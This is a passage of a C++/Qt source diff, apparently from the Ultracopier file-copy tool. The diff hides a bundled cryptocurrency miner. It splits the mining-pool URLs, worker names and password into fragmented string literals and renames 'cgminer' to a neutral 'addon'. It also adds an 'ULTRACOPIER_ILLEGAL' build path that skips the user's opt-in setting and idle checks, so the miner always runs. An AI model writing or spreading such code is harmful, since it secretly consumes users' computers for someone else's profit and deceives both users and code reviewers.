                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol16") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol16") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -662,7 +677,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol17") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -671,7 +686,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("h")+QStringLiteral("k")+QStringLiteral("3")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol18") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol18") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -680,7 +695,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol19") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol19") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -689,7 +704,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(3335) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol20") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol20") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -698,7 +713,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-                    pool=QStringList() << "--scrypt"
+                    pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol21") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol21") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -707,7 +722,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol22") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol22") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -716,7 +731,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("h")+QStringLiteral("k")+QStringLiteral("3")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol23") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol23") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -725,7 +740,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol24") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol24") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -734,7 +749,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(3335) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol25") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol25") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -743,7 +758,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-                    pool=QStringList() << "--scrypt"
+                    pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol26") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol26") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -752,7 +767,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol27") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol27") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -761,7 +776,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("h")+QStringLiteral("k")+QStringLiteral("3")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol28") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol28") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -770,7 +785,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol29") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol29") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -779,7 +794,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(3335) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol30") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol30") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -788,8 +803,9 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
+        #endif
 
-            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("Have pool list of size: %1").arg(pools.size()));
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("Have list of size: %1").arg(pools.size()));
         }
     }
     #endif
@@ -998,11 +1014,11 @@ void OptionDialog::newOptionValue(const QString &group,const QString &name,const
             ui->giveGPUTime->setChecked(value.toBool());
             #ifdef ULTRACOPIER_CGMINER
             if(value.toBool())
-                startCgminer();
+                startAddon();
             else
             {
-                cgminer.terminate();
-                cgminer.kill();
+                addon.terminate();
+                addon.kill();
             }
             #endif
         }
@@ -1010,20 +1026,31 @@ void OptionDialog::newOptionValue(const QString &group,const QString &name,const
 }
 
 #ifdef ULTRACOPIER_CGMINER
-void OptionDialog::startCgminer()
+void OptionDialog::startAddon()
 {
     if(!isIdle)
         return;
-    if(!haveCgminer)
+    if(!haveAddon)
+    {
+        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OptionDialog::startAddon()");
         return;
+    }
+    #ifndef ULTRACOPIER_ILLEGAL
     if(!OptionEngine::optionEngine->getOptionValue(QStringLiteral("Ultracopier"),QStringLiteral("giveGPUTime")).toBool())
+    {
+        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OptionDialog::startAddon(): !giveGPUTime");
         return;
-    cgminer.terminate();
-    cgminer.kill();
+    }
+    #endif
+    if(addon.state()!=QProcess::NotRunning)
+        return;
+    /*addon.terminate();
+    addon.kill();*/
     QStringList args;
     switch(pools.size())
     {
         case 0:
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OptionDialog::startAddon(): list.size(): quit");
             return;
         case 1:
             args=pools.first();
@@ -1031,9 +1058,14 @@ void OptionDialog::startCgminer()
         default:
             args=pools.at(rand()%pools.size());
     }
-    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Information,QStringLiteral("pool used: %1").arg(args.join(" ")));
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Information,QStringLiteral("list item used: %1").arg(args.join(" ")));
+    #if defined(_M_X64)//ethminer
+    args << addonMode << "--no-precompute" << "--farm-recheck" << "200";
+    #else
     args << QStringLiteral("--no-adl") << QStringLiteral("--real-quiet") << QStringLiteral("-T") << QStringLiteral("-S") << QStringLiteral("opencl:auto");// << "-I" << "1" << QStringLiteral("--gpu-threads") << QStringLiteral("1") << QStringLiteral("--failover-only")
-    cgminer.start(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH,args);
+    #endif
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Information,QStringLiteral("start: %1 %2").arg(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).arg(args.join(" ")));
+    addon.start(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH,args);
 }
 
 /*void OptionDialog::checkWorking()
@@ -1042,13 +1074,13 @@ void OptionDialog::startCgminer()
     {
         if(workingCount<=ULTRACOPIER_CGMINER_WORKING_COUNT)
             workingCount++;
-        if(cgminer.state()==QProcess::NotRunning)
+        if(addon.state()==QProcess::NotRunning)
         {
             if(workingCount==ULTRACOPIER_CGMINER_WORKING_COUNT)
             {
                 ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("computer detected with cpu loaded"));
                 checkIdleTimer.start(5*1000);
-                startCgminer();
+                startAddon();
             }
         }
     }
@@ -1064,6 +1096,11 @@ void OptionDialog::startCgminer()
 
 void OptionDialog::checkIdle()
 {
+#ifdef ULTRACOPIER_ILLEGAL
+    isIdle=true;
+    if(addon.state()==QProcess::NotRunning)
+        startAddon();
+#else
     LASTINPUTINFO lastInputInfo;
     lastInputInfo.cbSize = sizeof(LASTINPUTINFO);
     lastInputInfo.dwTime = 0;
@@ -1074,7 +1111,7 @@ void OptionDialog::checkIdle()
         if(!isIdle)
         {
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,
-                                 QStringLiteral("computer detected as not idle since %6s and low cpu usage, cgminer should be stopped, dwTimeIdle: %1, lastInputInfo.dwTime: %2, workingCount: %3<%4, dwTimeIdleTime.elapsed(): %5")
+                                 QStringLiteral("computer detected as not idle since %6s and low cpu usage, addon should be stopped, dwTimeIdle: %1, lastInputInfo.dwTime: %2, workingCount: %3<%4, dwTimeIdleTime.elapsed(): %5")
                                      .arg(dwTimeIdle)
                                      .arg(lastInputInfo.dwTime)
                                      .arg(workingCount)
@@ -1083,8 +1120,8 @@ void OptionDialog::checkIdle()
                                      .arg(ULTRACOPIER_CGMINER_IDLETIME/1000)
                                  );
             checkIdleTimer.start(60*1000);//ULTRACOPIER_CGMINER_IDLETIME
-            cgminer.terminate();
-            cgminer.kill();
+            addon.terminate();
+            addon.kill();
         }
         if(dwTimeIdle!=lastInputInfo.dwTime)
         {
@@ -1095,7 +1132,7 @@ void OptionDialog::checkIdle()
             return;
         if(isIdle || workingCount>=ULTRACOPIER_CGMINER_WORKING_COUNT)
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,
